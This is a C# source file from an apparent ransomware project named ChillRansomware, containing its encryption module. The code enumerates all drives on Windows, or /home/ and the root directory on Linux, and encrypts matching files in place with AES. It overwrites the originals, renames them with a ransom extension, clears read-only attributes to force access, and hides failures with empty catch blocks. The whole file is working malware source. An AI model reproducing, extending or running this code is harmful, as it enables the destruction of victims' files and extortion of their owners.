using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace ChillRansomware
{
    class Encryption
    {
        internal static void StartEncryption(string encryptionKey, byte[] salt)
        {
            byte[] PasswordBytes = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(encryptionKey));
            if (Settings.DebugMode)
            {
                EncryptDirectory(Settings.DebugDirPath, ref PasswordBytes, ref salt);
                return;
            }

            List<Thread> Threads = new List<Thread>();

            if (OperatingSystem.IsLinux())
            {
                Threads.Add(new Thread(() =>
                {
                    try { EncryptDirectory("/home/", ref PasswordBytes, ref salt); } catch { }
                }));
                Threads.Add(new Thread(() =>
                {
                    try { EncryptDirectory("/", ref PasswordBytes, ref salt); } catch { }
                }));
            }
            else
            {
                //Iterate through drives
                foreach (DriveInfo d in DriveInfo.GetDrives())
                {
                    if (d.IsReady == true)
                    {
                        Threads.Add(new Thread(() =>
                        {
                            try { EncryptDirectory(d.Name, ref PasswordBytes, ref salt); } catch { }
                        }));
                    }
                }
            }

            foreach (Thread t in Threads)
                t.Start();
            foreach (Thread t in Threads)
                t.Join();

        }

        public static void EncryptFile(string file, byte[] PasswordBytes, byte[] SaltBytes)
        {
            byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
            byte[] bytesEncrypted = AES_Encrypt(bytesToBeEncrypted, PasswordBytes, SaltBytes);

            File.WriteAllBytes(file, bytesEncrypted);
            File.Move(file, file + Settings.Extension); //rename file
        }

        public static void EncryptDirectory(string location, ref byte[] PwBytes, ref byte[] SaltBytes)
        {
            string[] files = Directory.GetFiles(location);
            string[] childDirectories = Directory.GetDirectories(location);
            for (int i = 0; i < files.Length; i++)
            {
                if (Settings.ValidExtensions.Contains(Path.GetExtension(files[i])) || Path.GetExtension(files[i]).Length==0)
                {
                    try
                    {
                        EncryptFile(files[i], PwBytes, SaltBytes);
                    }
                    catch
                    {
                        try { File.SetAttributes(files[i], FileAttributes.Normal); } catch { }
                        try { EncryptFile(files[i], PwBytes, SaltBytes); } catch { }
                    }
                }
            }
            for (int i = 0; i < childDirectories.Length; i++)
            {
                try { EncryptDirectory(childDirectories[i], ref PwBytes, ref SaltBytes); } catch { }
            }
        }

        public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] PasswordBytes, byte[] SaltBytes)
        {
            byte[] encryptedBytes = null;
            using (MemoryStream ms = new MemoryStream())
            {
                using (RijndaelManaged AES = new RijndaelManaged())
                {
                    AES.KeySize = 256;
                    AES.BlockSize = 128;

                    var key = new Rfc2898DeriveBytes(PasswordBytes, SaltBytes, 1000);
                    AES.Key = key.GetBytes(AES.KeySize / 8);
                    AES.IV = key.GetBytes(AES.BlockSize / 8);

                    AES.Mode = CipherMode.CBC;

                    using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                        cs.Close();
                    }
                    encryptedBytes = ms.ToArray();
                }
            }

            return encryptedBytes;
        }

    }
}
